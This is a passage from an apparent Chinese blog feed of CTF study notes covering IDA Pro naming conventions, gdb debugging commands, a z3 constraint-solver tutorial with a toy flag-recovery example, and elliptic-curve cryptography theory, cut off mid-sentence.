indexes</code> 显示索引，使得数组索引以常规的形式显示，如果选了这个选项，还会启动右边的Indexes选项栏，用于选择索引的显示格式</li><li><code>Create as array</code> 创建为数组，这个一般默认选上的</li></ul><p>创建好了以后，就变成了这样：<img src="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/image-20250327204404132.png" alt="image-20250327204404132"></p><h3 id="分支块"><a href="#分支块" class="headerlink" title="分支块"></a>分支块</h3><ul><li>重命名</li><li>折叠</li></ul><h3 id="创建结构体"><a href="#创建结构体" class="headerlink" title="创建结构体"></a>创建结构体</h3><p>快捷键<code>Insert</code></p><p><img src="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/image-20250327204713332.png" alt="image-20250327204713332"></p><p>在弹出的窗口中，可以编辑结构体的名字<br>这底下有三个复选框，</p><ul><li>第三个表示是否创建联合体。<br>需要注意的是，结构体的大小是它所包含的字段大小的总和，而联合体的大小则等于其中最大字段的大小</li></ul><p>在单击ok以后，就定好了一个空的结构体：</p><p><img src="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/image-20250327214552718.png" alt="image-20250327214552718"></p><p><img src="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/image-20250328084202610.png" alt="image-20250328084202610"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> **heap_list</span><br><span class="line"><span class="type">void</span> *heaplist[]</span><br><span class="line"><span class="comment">//选其一</span></span><br></pre></td></tr></table></figure><h2 id="IDA常见命名意义"><a href="#IDA常见命名意义" class="headerlink" title="IDA常见命名意义"></a>IDA常见命名意义</h2><p>IDA 经常会自动生成假名字。他们用于表示子 “函数，程序地址和数据”。</p><p>根据不同的类型和值假名字有不同前缀</p><blockquote><p>sub    指令和子函数起点<br>locret   返回指令<br>loc    指令</p><p>off 数据，包含偏移量<br>seg    数据，包含段地址值</p><p>asc 数据，ASCII字符串<br>byte    数据，字节（或字节数组）</p><p>word 数据，16位数据（或字数组）<br>dword   数据，32位数据（或双字数组）</p><p>qword 数据，64位数据（或4字数组）<br>flt    浮点数据，32位（或浮点数组）</p><p>dbl 浮点数，64位（或双精度数组）<br>tbyte   浮点数，80位（或扩展精度浮点数）</p><p>stru 结构体(或结构体数组)<br>algn    对齐指示unk 未处理字节</p></blockquote><p>IDA 中有常见的说明符号，如 db、dw、dd 分别代表了1个字节、2个字节、4个字节</p><ul><li>sub_xxxxxx：地址xxxxxx处的子例程</li><li>loc_xxxxxx：地址xxxxxx处的一个指令。</li><li>byte_xxxxxx：位置xxxxxx处的8位数据。</li><li>word_xxxxxx：位置xxxxxx处的16位数据</li><li>dword_xxxxxx：位置xxxxxx处的32位数据，</li><li>unk_xxxxxx：位置xxxxxx处的大小未知的数据。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 解题工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题工具 </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具篇·gdb</title>
      <link href="/2025/02/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7gdb/"/>
      <url>/2025/02/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7gdb/</url>
      
        <content type="html"><![CDATA[<p><a href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html"> 100个gdb小技巧</a></p><p><code>start</code>:程序自动中断在main函数处<br><code>c</code>:继续运行</p><p><code>b main</code>:main处下断点<br><code>r/run</code>:运行程序，遇到断点停下<br><code>vmmap</code>:查看内存映射，各加载文件的加载地址信息</p><p><code>-q</code>:参数不显示欢迎信息等<br><code>-n</code>:不加载任何插件，使用原生 gdb<br><code>info</code>:后面跟上想要查看的信息，如函数信息 info functions</p><p><code>b/breakpoint</code>:设置断点<br><code>del/delete breakpoints n</code>:删除断点，n是断点编号，可用info breakpoints命令查看断点信息</p><p><code>start</code>命令启动程序并停在开辟完主函数栈帧的地方<br><code>c/continue</code>:继续执行程序，遇到断点停下<br><code>f/finish</code>:结束程序</p><p><code>ni</code>:单步步过，一步一步执行指令遇到函数调用时直接执行完整个函数<br><code>si</code>:单步步入，一步一步执行指令遇到函数调用时跳转到函数内部</p><p><code>checksec</code>:查看程序的防护措施</p><p><code>pdisass/disassemble</code>:查看当前函数帧的反汇编代码，前一个命令有高亮显示只是需要安装pwndbg插件，后面一个命令时gdb自带的命令无高亮显示</p><p><code>p/print</code>:打印信息，如寄存器 p $ebp<br><code>p &amp; __libc_argv[0]</code>:可以得到argv[0]的地址</p><p><code>x/&lt;n/f/u&gt; &lt;addr&gt;</code>:查看某地址处的值，n/f/u 参数为可选，n代表想要查看多少个内存单元即从当前地址开始计算，每个内存单元的大小由后面的u参数指定；f表示显示格式，如s表示字符串形式，i为指令形式；u指定内存单元大小，b(一个字节)、h(双字节)、w(四个字节)、g(八字节)默认为w； 后面跟上x代表以十六进制的形式查看变量</p><p><code>set *addr = value</code>:设置某个地址的值</p>]]></content>
      
      
      <categories>
          
          <category> 解题工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 解题工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具篇·Qemu</title>
      <link href="/2025/01/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Qemu/"/>
      <url>/2025/01/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Qemu/</url>
      
        <content type="html"><![CDATA[<h2 id="待填坑"><a href="#待填坑" class="headerlink" title="待填坑"></a>待填坑</h2><p>纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备</p>]]></content>
      
      
      <categories>
          
          <category> 解题工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>工具篇·Ghidra</title>
      <link href="/2025/01/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Ghidra/"/>
      <url>/2025/01/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7Ghidra/</url>
      
        <content type="html"><![CDATA[<h2 id="待填坑"><a href="#待填坑" class="headerlink" title="待填坑"></a>待填坑</h2>]]></content>
      
      
      <categories>
          
          <category> 解题工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题工具 </tag>
            
            <tag> Ghidra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具篇·z3约束求解器</title>
      <link href="/2024/08/23/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7z3%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/08/23/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7z3%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="z3库"><a href="#z3库" class="headerlink" title="z3库"></a>z3库</h1><hr><h2 id="下载z3库"><a href="#下载z3库" class="headerlink" title="下载z3库"></a>下载z3库</h2><p><code>pip3 install z3-solver</code></p><hr><h2 id="基本变量类型"><a href="#基本变量类型" class="headerlink" title="基本变量类型"></a>基本变量类型</h2><p>整型(Int)，实型(Real)和向量(BitVec)</p><h3 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h3><ol><li>Int(name, ctx=None)，创建一个整数变量，name是名字</li><li>Ints (names, ctx=None)，创建多个整数变量，names是空格分隔名字</li></ol><h3 id="实数"><a href="#实数" class="headerlink" title="实数"></a>实数</h3><ol><li><p>real(name, ctx=None)，创建一个实变量，name是名字</p></li><li><p>reals (names, ctx=None)，创建多个实变量，names是空格分隔名字</p></li><li><p>realVal (val, ctx=None)，创建一个实常量，有初始值，没名字。</p></li></ol><h3 id="向量"><a href="#向量" class="headerlink" title="向量"></a>向量</h3><p>BitVec(变量名,变量的大小（单位bit）)</p><ol><li><p><code>BitVec(name,bv,ctx=None)</code>，创建一个位向量，name是他的名字，bv表示大小  </p></li><li><p><code>BitVecs(name,bv,ctx=None)</code>，创建一个有多变量的位向量，name是名字，bv表示大小  </p></li><li><p><code>BitVecVal(val,bv,ctx=None)</code>，创建一个位向量，有初始值，没名字。</p></li></ol><hr><h2 id="常用API"><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h2><ol><li>创建约束求解器  <code>s = Solver()</code></li><li>列方程<code>s.add(...)</code></li><li>判断解是否存在 （存在就打印返回sat）<code>s.check()</code></li><li>求解  <code>print(s.model()[向量名])</code></li></ol><p>用起来还是挺简单的，只不过这里必须要加check()检测不然会报错，如图：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入Z3约束求解库</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个名为&#x27;x&#x27;的整数符号变量</span></span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个名为&#x27;y&#x27;的整数符号变量</span></span><br><span class="line">y = Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个新的求解器对象，用于解决一组约束</span></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向求解器添加三个约束条件：</span></span><br><span class="line"><span class="comment"># 1. x 大于 2</span></span><br><span class="line"><span class="comment"># 2. y 小于 10</span></span><br><span class="line"><span class="comment"># 3. x 和 2倍的y 的和等于 7</span></span><br><span class="line">s.add(x &gt; <span class="number">2</span>, y &lt; <span class="number">10</span>, x + <span class="number">2</span>*y == <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查求解器中的约束是否有解</span></span><br><span class="line">s.check()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果求解器中的约束有解，则打印出满足这些约束的模型（即变量的赋值）</span></span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><hr><h2 id="例"><a href="#例" class="headerlink" title="例"></a>例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line"></span><br><span class="line">s = z3.Solver()</span><br><span class="line">flag = [z3.BitVec(<span class="string">f&#x27;flag_<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line"></span><br><span class="line">cipher = [</span><br><span class="line">     <span class="number">98</span>, <span class="number">113</span>, <span class="number">163</span>, <span class="number">181</span>, <span class="number">115</span>, <span class="number">148</span>, <span class="number">166</span>,  <span class="number">43</span>,   <span class="number">9</span>,  <span class="number">95</span>,</span><br><span class="line">    <span class="number">165</span>, <span class="number">146</span>,  <span class="number">79</span>, <span class="number">115</span>, <span class="number">146</span>, <span class="number">233</span>, <span class="number">112</span>, <span class="number">180</span>,  <span class="number">48</span>,  <span class="number">79</span>,</span><br><span class="line">     <span class="number">65</span>, <span class="number">181</span>, <span class="number">113</span>, <span class="number">146</span>,  <span class="number">46</span>, <span class="number">249</span>,  <span class="number">78</span>, <span class="number">183</span>,  <span class="number">79</span>, <span class="number">133</span>,</span><br><span class="line">    <span class="number">180</span>, <span class="number">113</span>, <span class="number">146</span>, <span class="number">148</span>, <span class="number">163</span>,  <span class="number">79</span>,  <span class="number">78</span>,  <span class="number">48</span>, <span class="number">231</span>,  <span class="number">77</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    s.add(<span class="number">32</span> &lt;= flag[i], flag[i] &lt;= <span class="number">126</span>)</span><br><span class="line">    s.add(flag[i] * <span class="number">17</span> == cipher[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == z3.sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(m[f].as_long()) <span class="keyword">for</span> f <span class="keyword">in</span> flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># BaseCTF&#123;yoUr_CrYpt0_1earNinG_5tarTs_n0w&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 解题工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题工具 </tag>
            
            <tag> z3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>筑基篇·椭圆曲线</title>
      <link href="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/"/>
      <url>/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<h2 id="密码学学习笔记——筑基篇·卷五（椭圆曲线）"><a href="#密码学学习笔记——筑基篇·卷五（椭圆曲线）" class="headerlink" title="密码学学习笔记——筑基篇·卷五（椭圆曲线）"></a>密码学学习笔记——筑基篇·卷五（椭圆曲线）</h2><hr><h1 id="椭圆曲线"><a href="#椭圆曲线" class="headerlink" title="椭圆曲线"></a>椭圆曲线</h1><hr><h2 id="椭圆曲线-elliptic-curve"><a href="#椭圆曲线-elliptic-curve" class="headerlink" title="椭圆曲线(elliptic curve)"></a>椭圆曲线(elliptic curve)</h2><p><strong>定义</strong>：<strong>椭圆曲线</strong>是一条由方程$y^2=x^3+ax+b$给定的曲线，其中 $a,b\in F,char(F)\neq 2,3$，，并满足 $\Delta=4a^3+27b^2\neq0$ 。<br>丢番图曲线：$y^2=x^3-x+9$ ($a=-1,b=9)$, ($x,y)\in\mathbb{Q}^2$</p><p>$\Delta\neq0$:非奇异(non-singular),<strong>光滑</strong>，$x^3+ax+b$无重根<br>$\Delta=0$:奇异 (singular),不光滑，$x^3+ax+b$<strong>有重根(奇异点)</strong></p><blockquote><p>补充：有重根说明多项式和它的导数存在公共根</p><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822164917677.png" alt="奇异点"></p><p>前两个叫<strong>结点(node)</strong>，第三个叫<strong>尖点(cusp)</strong></p><p><strong>奇异点</strong>：</p><ul><li>该点处曲线不可微分，即奇异点处无法作切线(切线值无定义)</li><li>只要椭圆曲线是奇异的，奇异点就一定在x轴上</li><li>当点的集合包含奇异点时无法构成群，因为奇异点处无法作切线，故讨论椭圆曲线时排除奇异的情况</li><li>奇异点到原点的距离是左根到原点的距离的一半</li></ul><p><strong>判别式</strong>:</p><p>$\Delta&lt;0$时：</p><ul><li>图像有一个组成部分</li><li>$x^3+ax+b=0$只有唯一的实数根</li></ul><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822165700141-1724317031959-1.png" alt="判别式小于0"></p><p>$\Delta&gt;0$时：</p><ul><li>图像有两个组成部分</li><li>$x^3+ax+b=0$有三个不同的实数根</li></ul><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822165825940.png" alt="判别式大于0"></p><ul><li><strong>椭圆曲线</strong>：魏尔斯特拉斯方程 $y^2=x^3+ax+b$定义在域上的一条光滑射影<strong>亏格(genus)为1</strong>的曲线。</li><li><strong>椭圆</strong>：<strong>亏格为0</strong>的曲线。</li></ul></blockquote><h3 id="椭圆曲线上的点"><a href="#椭圆曲线上的点" class="headerlink" title="椭圆曲线上的点"></a>椭圆曲线上的点</h3><script type="math/tex; mode=display">E=\{(x,y)|y^2=x^3+ax+b\}\cup\{O\}</script><p>椭圆曲线上的点通常用P、Q或R表示<br>O:<strong>无穷远点(point at infinity)</strong></p><hr><h2 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h2><h3 id="几何表示"><a href="#几何表示" class="headerlink" title="几何表示"></a>几何表示</h3><p>群：$(E,+)$<br>加法运算+: $E$里点和点之间的加法(并非简单的坐标间加法，而是一种几何的方法)</p><p>$(E,+)$<strong>加法阿贝尔群</strong>对于$\forall P,Q,R\in E$,都有</p><ul><li>封闭性：$P+Q\in E$</li><li>结合律：$(P+Q)+R=P+(Q+R)$</li><li>单位元：$P+O=O+P=P$ (<strong>无穷远点$O$是单位元</strong>)</li><li>逆元：$P+(-P)=O$    ($P=(x_1,y_1),-P=(x_1,-y_1)$)</li><li>交换律：$P+Q=Q+P$</li></ul><p><strong>椭圆曲线三个点在一条直线上时，三个相加等于无穷远点</strong></p><p><strong>4种情况</strong>:</p><ul><li><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822160653715.png" alt="情况1"></li><li><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822160748703.png" alt="情况2"></li><li><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822160818652.png" alt="情况3"></li><li><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822160906817.png" alt="情况4"></li></ul><p>$nP:=P+P+\cdots+P$<br>$0P=O,\quad(-n)P=-(nP)$</p><p><strong>点P的阶</strong>：$\text{满足 }nP=O\text{的最小正整数}n$</p><h3 id="坐标表示"><a href="#坐标表示" class="headerlink" title="坐标表示"></a>坐标表示</h3><p>$P=(x_1,y_1),Q=(x_2,y_2)$,则$P+Q$ 有四种情况:</p><ol><li>$P\neq Q$ 且$x_1\neq x_2$</li><li>$P\neq Q$ 且$x_1 = x_2 : P+Q=O$</li><li>$P=Q$且$y_1\neq0$</li><li>$P=Q$且$y_1=0:P+P=2P=O$</li></ol><script type="math/tex; mode=display">\text{设 }P=(x_1,y_1),Q=(x_2,y_2),\quad\text{直线 }L\text{方程为 }y=\lambda x+c,\text{ 则}\\\lambda=\begin{cases}\dfrac{y_2-y_1}{x_2-x_1},&P\neq Q\text{ 且 }x_1\neq x_2\\\dfrac{3x_1^2+a}{2y_1},&P=Q\text{ 且 }y_1\neq0(隐函数求导算斜率)\end{cases}</script><script type="math/tex; mode=display">c=y_1-\lambda x_1=\begin{cases}\frac{y_1x_2-y_2x_1}{x_2-x_1},&\quad P\neq Q\text{ 且 }x_1\neq x_2\\\frac{-x_1^3+ax_1+2b}{2y_1},&\quad P=Q\text{ 且 }y_1\neq0\end{cases}</script><script type="math/tex; mode=display">\begin{gathered}(\lambda x+c)^{2}=x^{3}+ax+b \\f(x)=x^{3}+ax+b-(\lambda x+c)^{2} \\\text{设 }R=(x_3,y_3),\text{则} \\f(x)=(x-x_{1})(x-x_{2})(x-x_{3}) \\x^3+ax+b-(\lambda x+c)^2=(x-x_1)(x-x_2)(x-x_3)\end{gathered}</script><script type="math/tex; mode=display">\begin{aligned}&x^3-\lambda^2x^2-2\lambda cx+ax+b-c^2\\&=x^3-(x_1+x_2+x_3)x^2+(x_1x_2+x_1x_3+x_2x_3)x-x_1x_2x_3\\&\lambda^2=x_1+x_2+x_3\Longrightarrow x_3=\lambda^2-x_1-x_2\\&y_{3}=\lambda x_{3}+c\end{aligned}</script><script type="math/tex; mode=display">\begin{aligned}P+Q=-R& =(x_3,-y_3)=(\lambda^2-x_1-x_2,-\lambda x_3-c) \\&=\left(\lambda^2-x_1-x_2,-\lambda^3+(x_1+x_2)\lambda-c\right)\end{aligned}</script><h3 id="点的加法算法"><a href="#点的加法算法" class="headerlink" title="点的加法算法"></a>点的加法算法</h3><p>$P=(x_1,y_1),Q=(x_2,y_2)$,椭圆曲线为$x^3+ax+b:$</p><ul><li><p>if  $\left(P\neq Q\mathrm{~and~}x_1=x_2\right)$or$\left(P=Q\mathrm{~and~}y_1=0\right)$</p><p>​        return $O$</p></li><li><p>if  $P\neq Q$ and $x_1\neq x_2$，      $\lambda=\frac{y_2-y_1}{x_2-x_1}\:,\:c=\frac{y_1x_2-y_2x_1}{x_2-x_1}$</p><p>else      $\lambda=\frac{3x_{1}^{2}+a}{2y_{1}},c=\frac{-x_{1}^{3}+ax_{1}+2b}{2y_{1}}$$(即P=Q$ and $y_1\neq0)$</p></li><li><p>return $(x_3,-y_3)=(\lambda^2-x_1-x_2,-\lambda^3+(x_1+x_2)\lambda-c)$</p></li></ul><p><strong>定理</strong> (Poincaré,约1900年):设$F$是域，椭圆曲线方程为<br>$x^3+ax+b,a,b\in F$,及$E=\begin{Bmatrix}(x,y)&amp;x^3+ax+b\end{Bmatrix}\cup\begin{Bmatrix}0\end{Bmatrix}$<br>设$E(F)={(x,y)\in E\mid x,y\in F}\cup{O}$,则$E(F)$是$E$的子群</p><hr><h2 id="无穷远点"><a href="#无穷远点" class="headerlink" title="无穷远点"></a>无穷远点</h2><p><strong>仿射平面</strong>：仿射坐标$(x,y)\in A^2(F)$<br><strong>射影平面</strong>：射影坐标$(X,Y,Z)\in P^2(F)$<br>$(0,0,0)\notin P^2(F)$<br><strong>转换公式</strong>：$x=\frac{X}{Z},y=\frac{Y}{Z}$</p><blockquote><p>例：仿射坐标<script type="math/tex">(x,y)=(3,2)</script><br>射影坐标<script type="math/tex">(X{:}Y{:}Z)=(3{:}2{:}1)</script>（X,Y,Z）=(3Z,2Z,Z)</p></blockquote><p><strong>仿射点</strong>：坐标形式为$(X:Y:1)$的点</p><h3 id="无穷远点的坐标"><a href="#无穷远点的坐标" class="headerlink" title="无穷远点的坐标"></a>无穷远点的坐标</h3><p>$x=\frac X0,y=\frac Y0$</p><p><strong>仿射</strong>坐标(无法表示)$\longleftarrow$<strong>射影</strong>坐标$(X:Y:0)$</p><h3 id="无穷远线-line-at-infinity"><a href="#无穷远线-line-at-infinity" class="headerlink" title="无穷远线(line at infinity)"></a>无穷远线(line at infinity)</h3><p>无穷远点$(X:Y:0)$<br>无穷远线：$(X:1:0)$和$(1:0:0)$形成的直线,嵌在射影平面用$P^1(F)$表示</p><hr><h2 id="有限域上的椭圆曲线"><a href="#有限域上的椭圆曲线" class="headerlink" title="有限域上的椭圆曲线"></a>有限域上的椭圆曲线</h2><p>$Z_p:$ 椭圆曲线密码常用的有限域 $(p&gt;3$是素数)</p><script type="math/tex; mode=display">F_p\cong Z_p</script><p>定义在$F_p$上的椭圆曲线(坐标运算都是模$p$的)</p><p>方程：$y^2\equiv x^3+ax+b\pmod p$),其中$a,b\in F_p$是常数</p><p>满足：$\Delta=4a^3+27b^2\not\equiv0\pmod p$。</p><p>点：$(x,y)\in F_p\times F_p$<br>群：$E(F_p)$</p><p>$y^2\equiv x^3+ax+b\pmod p$</p><p>$|E(F_p)|\leq2p+1(\text{每个}x\text{对应两个}y\text{,而}x\text{的取值不超过}p\text{个},此处加上无穷远点)$</p><p><strong>定理 (Hasse,1933)</strong>: $p+1-2\sqrt{p}\leq\left|E(F_p)\right|\leq p+1+2\sqrt{p}$<br><strong>Schoof 算法</strong>：计算 $|E(F_p)|$的大小<br>(时间复杂度：$O((logp)^8)$个比特运算和$\mathcal{O}((logp)^6)$个$\mathbb{Z}_p$中运算)</p><p><strong>定理</strong>：$E(F_p)$是循环群或同构于两个循环群的笛卡尔乘积$(p&gt;3)$<br>$E(F_p)\cong Z_{n_2}\times Z_{n_1}$</p><p>$E(F_p)\cong Z_{n_2}\times Z_{n_1}$<br>$n_2\mid n_1,n_2\mid(p-1)$</p><p><strong>定理</strong>:$|E(F_p)|$是素数或两个不同素数乘积,则$E(F_p)$是循环群$(p&gt;3)$</p><hr><h2 id="点压缩-point-compress"><a href="#点压缩-point-compress" class="headerlink" title="点压缩(point compress)"></a>点压缩(point compress)</h2><p>$(x,y)转为存储(x,y\ mod\ 2),即y是奇数存储(x,1),y是偶数存储(x,0),y是偶数$</p><h3 id="点解压-point-decompress"><a href="#点解压-point-decompress" class="headerlink" title="点解压(point decompress)"></a>点解压(point decompress)</h3><p>$(x,y\ mod\ 2)$<br>$y^2=x^3+ax+b\ mod\ p$<br>$y=\pm\sqrt{x^3+ax+b}\:mod\:p\longrightarrow y_1=y，y_2=p-y$</p><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/image-20240822184615584.png" alt="点压缩与点解压"></p><hr><h2 id="同源-isogeny"><a href="#同源-isogeny" class="headerlink" title="同源(isogeny)"></a>同源(isogeny)</h2><p>椭圆曲线的结构特点</p><ul><li>几何结构(光滑射影曲线)</li><li>代数结构(点群$E$)</li></ul><p><strong>同源</strong>是一种保持椭圆曲线结构的映射</p><script type="math/tex; mode=display">\text{同源 }\phi{:}E(K)\to E^{\prime}(K)\text{ 是个群同态(满同态)(}K\text{是域)}</script><ul><li>$\phi(O)=O^{\prime}$</li></ul><p><strong>自同态 (endomorphism)</strong>: 椭圆曲线到自身的同源<br><strong>自同构 (automorphism)</strong>: 同源是自同态，也是同构</p><p><strong>注意</strong>：自同态未必是同源，比如：$\forall P\in E(K),\phi(P)=O$ ,是自同态，但不是同源(因为不是满同态)</p><blockquote><p>例：$\phi{:}E(K)\to E(K)$，记$\phi:=[n]$<br>$P\mapsto nP$<br>自同态 $(n=0$时不是同源)<br>$n\neq0:$同源<br>$n=\pm1:$自同构</p><p>对于大多数椭圆曲线，唯一的自同态就是这种形式的同源</p></blockquote><h3 id="同源的标准形式"><a href="#同源的标准形式" class="headerlink" title="同源的标准形式"></a>同源的标准形式</h3><p>设 $\phi{:}E(K)\to E^{\prime}(K)$ 是同源 $(K$是域),点$P=(x,y)\in E(K)$,<br>则仿射坐标下，$\phi$具有以下标准形式(standard form):</p><script type="math/tex; mode=display">\phi(x,y)=(\frac{u(x)}{v(x)},\frac{s(x)}{t(x)}y)</script><p>其中$u(x),v(x),s(x),t(x)\in K[X],u(x),v(x)$互素，$s(x),t(x)$互素。</p><p><strong>推论</strong>：设$E(K)$ 的方程为 $y^2= x^3+ ax+ b$, $f( x) = x^3+ ax+b$,则：<br>$v^3(x)\mid t^2(x)$<br>$t^2(x)\mid v^3(x)f(x)$<br>同源$\phi{:}E(K)\to E^{\prime}(K)$是同源 (K是域)<br>$\phi(x,y)=(\frac{u(x)}{v(x)},\frac{s(x)}{t(x)}y)$</p><h3 id="弗罗贝尼乌斯自同态-Frobenius-endomorphism"><a href="#弗罗贝尼乌斯自同态-Frobenius-endomorphism" class="headerlink" title="弗罗贝尼乌斯自同态(Frobenius endomorphism)"></a>弗罗贝尼乌斯自同态(Frobenius endomorphism)</h3><p>$\pi{:}E(F_q)\to E(F_q)$<br>$(X{:}Y{:}Z)\mapsto(X^q:Y^q:Z^q)$</p><p>$E(F_q)$的方程$y^2=x^3+ax+b,a,b\in F_q,(x,y)\in F_q^2$<br>$\pi(x,y)=(x^q,\:(x^3+ax+b)^{\frac{q-1}2}y)$</p><p>$u(x)=x^q，v(x)=e，s(x)=(x^3+ax+b)^{\frac{q-1}2}，t(x)=e$</p><blockquote><p>注：若$F_q$的特征是素数$p$<br>$\boldsymbol{\pi}^{\prime}:E(F_q)\to E^{\prime}(F_q)$<br>$(X{:}Y{:}Z)\mapsto(X^p{:}Y^p{:}Z^p)$<br>同源(未必是自同态)</p></blockquote><p><strong>定理 (Sato-Tate定理)</strong>：$\left|E(F_q)\right|=\left|E^{\prime}(F_q)\right|,当且仅当,这两个椭圆曲线同源。$</p><h3 id="同源的度-degree-of-isogeny"><a href="#同源的度-degree-of-isogeny" class="headerlink" title="同源的度(degree of isogeny)"></a>同源的度(degree of isogeny)</h3><p>定义(同源的度): $\phi(x,y)=(\frac {u(x)}{v(x)},\frac{s(x)}{t(x)}y)$是标准形式，同源$\phi$的度是<br>$deg(\phi):=\max(deg(u(x)),deg(v(x)))。$</p><h3 id="同源的可分性-separability"><a href="#同源的可分性-separability" class="headerlink" title="同源的可分性(separability)"></a>同源的可分性(separability)</h3><p><strong>定义(可分性)</strong>: $\phi(x,y)=(\frac {u(x)}{v(x)},\frac{s(x)}{t(x)}y)$是标准形式，<br>如果 $(\frac{u(x)}{v(x)})^{\prime}\neq\theta$,则称$\phi$是<strong>可分的(separable);</strong><br>如果 ($\frac{u(x)}{v(x)})^{\prime}=\theta$,则称$\phi$是<strong>不可分的 (inseparable)。</strong></p><h3 id="同源的分解"><a href="#同源的分解" class="headerlink" title="同源的分解"></a>同源的分解</h3><p>任何特征大于0的同源都可以分解成可分同源和不可分同源的复合</p><p><strong>引理1</strong>：域$K$的特征是$p$。设多项式 $u(x),v(x)\in K[X]$互素，则<br>$(\frac{u(x)}{v(x)})^{\prime}=\theta\Leftrightarrow u^{\prime}(x)=v^{\prime}(x)=\theta$<br>$\Leftrightarrow u(x)=f(x^{p}),v(x)=g(x^{p})\:,$<br>其中$f(x)$,g$(x)\in K[X]$</p><p><strong>引理2</strong>：$\phi{:}E(K)\to E^{\prime}(K)$是不可分同源，$K$ 的特征是$p$ 。则标准形式下，有</p><script type="math/tex; mode=display">\phi(x,y)=\phi(a(x^p),b(x^p)y^p)\:,</script><p>其中$a(x),b(x)\in K[X]$</p><p><strong>性质</strong>：同源$\phi{:}E(K)\to 